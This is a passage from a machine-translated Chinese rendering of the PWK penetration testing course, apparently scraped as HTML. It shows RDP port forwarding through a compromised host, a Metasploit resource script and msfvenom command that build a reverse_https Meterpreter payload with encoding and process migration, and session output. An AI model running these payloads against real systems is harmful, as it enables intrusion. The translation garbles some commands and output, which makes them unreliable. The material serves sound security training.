<div style="position:absolute;top:122381;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 本地 TCP 中继创建：:3389 &lt;-&gt; 192.168.1.110:3389</font></font></nobr></div>
<div style="position:absolute;top:122400;left:314"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 813 - 在端口 3389 上转发端口转发 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:122539;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="104"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 104 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:122572;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:123649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:123649;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:123649;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">721</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:122668;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们通过 rdesktop 连接到 127.0.0.1:3389 以访问受感染主机来测试这一点</font></font></nobr></div>
<div style="position:absolute;top:122687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在内部网络中。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:122722;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rdesktop 127.0.0.1</font></font></font></b></nobr></div>
<div style="position:absolute;top:122739;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动选择的键盘映射 en-us</font></font></nobr></div>
<div style="position:absolute;top:122756;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错误：CredSSP：初始化失败，您是否有正确的 kerberos tgt 初始化？</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:122773;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 SSL 建立的连接。</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:122790;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">警告：远程桌面不支持色深 24；</font><font style="vertical-align: inherit;">回落到 16</font></font></nobr></div>
<div style="position:absolute;top:122809;left:268"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 814 - 使用端口转发获得远程桌面访问</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:122838;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用这种技术，我们能够在主机上获得远程桌面会话，否则我们无法</font></font></nobr></div>
<div style="position:absolute;top:122858;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">能够从我们的 Kali 系统访问。</font><font style="vertical-align: inherit;">同样，如果域控制器连接到</font></font></nobr></div>
<div style="position:absolute;top:122877;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">额外的网络，我们可以创建一个枢轴链来到达任何主机。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:122912;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.5.4.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:122942;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.使用后开发模块和扩展以及旋转技术来枚举</font></font></nobr></div>
<div style="position:absolute;top:122961;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并从从您获得的meterpreter shell中破坏域控制器</font></font></nobr></div>
<div style="position:absolute;top:122980;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 10 客户端。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:123018;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.6 Metasploit 自动化</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:123059;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然 Metasploit 框架为我们自动化了很多，但我们可以进一步自动化重复</font></font></nobr></div>
<div style="position:absolute;top:123079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">框架内部的命令。</font></font></nobr></div>
<div style="position:absolute;top:123111;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们使用负载创建独立的可执行文件或客户端攻击向量时</font></font></nobr></div>
<div style="position:absolute;top:123131;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTML 应用程序，我们选择负载类型、本地主机和本地端口等选项。</font><font style="vertical-align: inherit;">相同的选项</font></font></nobr></div>
<div style="position:absolute;top:123150;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后必须在 multi/handler 模块中设置。</font><font style="vertical-align: inherit;">为了简化这一点，我们可以利用</font></font></nobr></div>
<div style="position:absolute;top:123170;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit 资源脚本。</font><font style="vertical-align: inherit;">我们可以在资源脚本中使用任意数量的 Metasploit 命令。</font></font></nobr></div>
<div style="position:absolute;top:123202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，使用标准编辑器，我们将在名为 setup.rc 的主目录中创建一个脚本。</font></font></nobr></div>
<div style="position:absolute;top:123221;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在此脚本中，我们将有效负载设置为 windows/meterpreter/reverse_https 并配置</font></font></nobr></div>
<div style="position:absolute;top:123241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相关的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LHOST</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LPORT</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数。</font><font style="vertical-align: inherit;">我们还使用</font></font></nobr></div>
<div style="position:absolute;top:123260;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 编码器并将 post/windows/manage/migrate 模块配置为</font></font></nobr></div>
<div style="position:absolute;top:123280;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AutoRunScript</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项</font><font style="vertical-align: inherit;">自动执行</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">这将导致产生的meterpreter</font></font></nobr></div>
<div style="position:absolute;top:123299;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动启动后台 notepad.exe 进程并迁移到该进程。</font><font style="vertical-align: inherit;">最后，</font></font></nobr></div>
<div style="position:absolute;top:123318;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ExitOnSession</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数设置为“false”以确保侦听器不断接受新的</font></font></nobr></div>
<div style="position:absolute;top:123338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接和模块使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-j</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-z</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志执行以阻止我们自动</font></font></nobr></div>
<div style="position:absolute;top:123357;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与会话交互。</font><font style="vertical-align: inherit;">执行此操作的命令如下：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:123392;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用exploit/multi/handler</font></font></nobr></div>
<div style="position:absolute;top:123409;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 PAYLOAD windows/meterpreter/reverse_https</font></font></nobr></div>
<div style="position:absolute;top:123426;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 LHOST 10.11.0.4</font></font></nobr></div>
<div style="position:absolute;top:123443;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 LPORT 443</font></font></nobr></div>
<div style="position:absolute;top:123460;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 EnableStageEncoding 为真</font></font></nobr></div>
<div style="position:absolute;top:123477;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 StageEncoder x86/shikata_ga_nai</font></font></nobr></div>
<div style="position:absolute;top:123494;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 AutoRunScript post/windows/manage/migrate </font></font></nobr></div>
<div style="position:absolute;top:123511;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将 ExitOnSession 设置为 false</font></font></nobr></div>
<div style="position:absolute;top:123528;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用 -j -z</font></font></nobr></div>
<div style="position:absolute;top:123547;left:280"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 815 - 用于设置 multi/handler 的 Metasploit 资源脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:123576;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保存脚本后，我们可以通过将</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-r</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志</font><font style="vertical-align: inherit;">传递</font><font style="vertical-align: inherit;">给</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfconsole</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来执行它，</font><font style="vertical-align: inherit;">如清单所示</font></font></nobr></div>
<div style="position:absolute;top:123596;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">816. </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:123727;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="105"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 105 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:123760;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:124837;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:124837;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:124837;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">722</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:123858;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo msfconsole -r setup.rc</font></font></font></b></nobr></div>
<div style="position:absolute;top:123875;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:123892;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 为 ERB 指令处理 setup.rc。</font></font></nobr></div>
<div style="position:absolute;top:123909;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">资源（setup.rc）&gt; 使用exploit/multi/handler</font></font></nobr></div>
<div style="position:absolute;top:123926;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">资源 (setup.rc)&gt; 设置 PAYLOAD windows/meterpreter/reverse_https</font></font></nobr></div>
<div style="position:absolute;top:123943;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PAYLOAD =&gt; windows/meterpreter/reverse_https</font></font></nobr></div>
<div style="position:absolute;top:123960;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">资源 (setup.rc)&gt; 设置 LHOST 10.11.0.4</font></font></nobr></div>
<div style="position:absolute;top:123976;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LHOST =&gt; 10.11.0.4</font></font></nobr></div>
<div style="position:absolute;top:123993;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">资源 (setup.rc)&gt; 设置 LPORT 443</font></font></nobr></div>
<div style="position:absolute;top:124011;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">左端口 =&gt; 443</font></font></nobr></div>
<div style="position:absolute;top:124028;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">资源 (setup.rc)&gt; 设置 EnableStageEncoding true</font></font></nobr></div>
<div style="position:absolute;top:124045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EnableStageEncoding =&gt; 真</font></font></nobr></div>
<div style="position:absolute;top:124061;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">资源 (setup.rc)&gt; 设置 StageEncoder x86/shikata_ga_nai</font></font></nobr></div>
<div style="position:absolute;top:124078;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">StageEncoder =&gt; x86/shikata_ga_nai</font></font></nobr></div>
<div style="position:absolute;top:124095;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">资源 (setup.rc)&gt; 设置 AutoRunScript post/windows/manage/migrate</font></font></nobr></div>
<div style="position:absolute;top:124112;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AutoRunScript =&gt; post/windows/manage/migrate</font></font></nobr></div>
<div style="position:absolute;top:124129;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">资源 (setup.rc)&gt; 设置 ExitOnSession false</font></font></nobr></div>
<div style="position:absolute;top:124146;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ExitOnSession =&gt; 假</font></font></nobr></div>
<div style="position:absolute;top:124163;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">资源 (setup.rc)&gt; 漏洞利用 -j -z</font></font></nobr></div>
<div style="position:absolute;top:124180;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 作为后台作业 0 运行的漏洞利用。</font></font></nobr></div>
<div style="position:absolute;top:124197;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt; </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:124214;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 https://10.11.0.4:443 上启动 HTTPS 反向处理程序</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:124234;left:339"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 816 - 执行资源脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:124263;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">配置并运行监听器后，我们可以，例如，启动一个包含</font></font></nobr></div>
<div style="position:absolute;top:124282;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自我们的 Windows VM 的 meterpreter 负载。</font><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建这个可执行文件</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:124317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom -p windows/meterpreter/reverse_https LHOST=10.11.0.4 LPORT=443</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:124334;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-f exe -o 遇见.exe</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:124351;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 未选择平台，从有效负载中选择 Msf::Module::Platform::Windows</font></font></nobr></div>
<div style="position:absolute;top:124368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 未选择 arch，从有效载荷中选择 arch: x86</font></font></nobr></div>
<div style="position:absolute;top:124385;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未指定编码器或 badchars，输出原始负载</font></font></nobr></div>
<div style="position:absolute;top:124402;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷大小：589 字节</font></font></nobr></div>
<div style="position:absolute;top:124419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exe文件的最终大小：73802字节</font></font></nobr></div>
<div style="position:absolute;top:124436;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另存为：met.exe</font></font></nobr></div>
<div style="position:absolute;top:124455;left:325"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 817 - 创建一个 Meterpreter 可执行文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:124485;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行时，我们的 multi/handler 接受连接：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:124519;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] https://10.11.0.4:443 来自 10.11.0.22 的请求；</font><font style="vertical-align: inherit;">使用 shikata_ga_nai 编码的舞台</font></font></nobr></div>
<div style="position:absolute;top:124537;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] https://10.11.0.4:443 来自 10.11.0.22 的请求；</font><font style="vertical-align: inherit;">暂存 x86 有效负载（180854 字节）</font></font></nobr></div>
<div style="position:absolute;top:124554;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter 会话 1 打开</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(10.11.0.4:443 -&gt; 10.11.0.22:49783)</font></font></nobr></div>
<div style="position:absolute;top:124570;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 会话 ID 1 (10.11.0.4:443 -&gt; 10.11.0.22:49783)</font></font><b><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">处理 AutoRunScript 'post/wi</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#00b050" face="Times"><span style="font-size:11px;font-family:Times;color:#00b050">
<div style="position:absolute;top:124587;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">浏览/管理/迁移'</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:124604;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 针对 CLIENT251 运行模块</font></font></nobr></div>
<div style="position:absolute;top:124621;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 当前服务器进程：test.exe (7520)</font></font></nobr></div>
<div style="position:absolute;top:124639;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 生成</font><font style="vertical-align: inherit;">要迁移到的</font></font><b><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">notepad.exe 进程</font></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:124655;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 迁移到 4724</font></font></nobr></div>
<div style="position:absolute;top:124672;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+]</font></font><b><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功迁移到进程 4724</font></font></font></b></nobr></div>
<div style="position:absolute;top:124692;left:288"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 818 - Metasploit multi/handler 接受连接</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:124721;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话是使用编码的第二阶段有效负载生成的并成功迁移</font></font></nobr></div>
<div style="position:absolute;top:124740;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动进入notepad.exe进程。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:124915;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="106"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 106 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:124948;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:126025;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:126025;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:126025;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">723</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:125044;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.6.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:125074;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用第二阶段编码器和自动运行脚本创建资源脚本并使用它</font></font></nobr></div>
<div style="position:absolute;top:125093;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与meterpreter有效载荷。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:125130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.7 总结</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:125172;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit 框架在渗透测试的几乎每个阶段都很有价值，包括被动</font></font></nobr></div>
<div style="position:absolute;top:125191;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主动信息收集、漏洞研究和开发、客户端攻击、后</font></font></nobr></div>
<div style="position:absolute;top:125211;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">剥削等等。</font></font></nobr></div>
<div style="position:absolute;top:125244;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们介绍了 Metasploit 框架的一些主要功能。</font></font></nobr></div>
<div style="position:absolute;top:125263;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，由于模块和功能数量如此之多，很容易迷失方向。</font><font style="vertical-align: inherit;">帮助</font></font></nobr></div>
<div style="position:absolute;top:125282;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">巩固这些技巧，我们强烈建议您彻底完成以下练习</font></font></nobr></div>
<div style="position:absolute;top:125302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个模块是指游离进攻安全的在线课程，Metasploit的偷跑，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">718</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对</font></font></nobr></div>
<div style="position:absolute;top:125321;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更深入的培训和信息。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:125975;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">718 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2017 年），https://www.offensive-security.com/metasploit-unleashed/Using_the_Database</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:126103;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="107"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 107 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:126136;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:127213;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:127213;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:127213;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">724</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:126226;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.7.1.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:126252;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23. PowerShell 帝国</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:126296;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Empire </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">719</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个“PowerShell 和 Python 后开发代理”，重点关注客户端</font></font></nobr></div>
<div style="position:absolute;top:126316;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Active Directory (AD) 部署的利用和后利用。</font></font></nobr></div>
<div style="position:absolute;top:126348;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Windows 上使用 PowerShell 执行开发和后开发，在 Windows 上使用 Python</font></font></nobr></div>
<div style="position:absolute;top:126368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 和 macOS。</font><font style="vertical-align: inherit;">Empire 依赖于标准的预装库和功能；</font><font style="vertical-align: inherit;">电源外壳</font></font></nobr></div>
<div style="position:absolute;top:126387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行只需要 PowerShell 版本 2（从 Windows 7 开始预装）以及 Linux 和 Mac</font></font></nobr></div>
